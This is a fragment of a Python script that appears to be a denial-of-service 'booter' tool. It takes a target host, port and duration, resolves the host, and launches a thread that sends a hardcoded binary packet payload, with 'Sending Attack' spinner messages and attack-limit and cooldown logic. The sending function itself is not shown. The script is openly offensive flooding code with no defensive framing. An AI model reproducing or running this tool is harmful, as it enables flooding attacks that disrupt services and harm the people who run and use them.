					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			main()


try:
	clear = "clear"
	os.system("cls")
	print(banner)
	main()
except KeyboardInterrupt:
	exit()

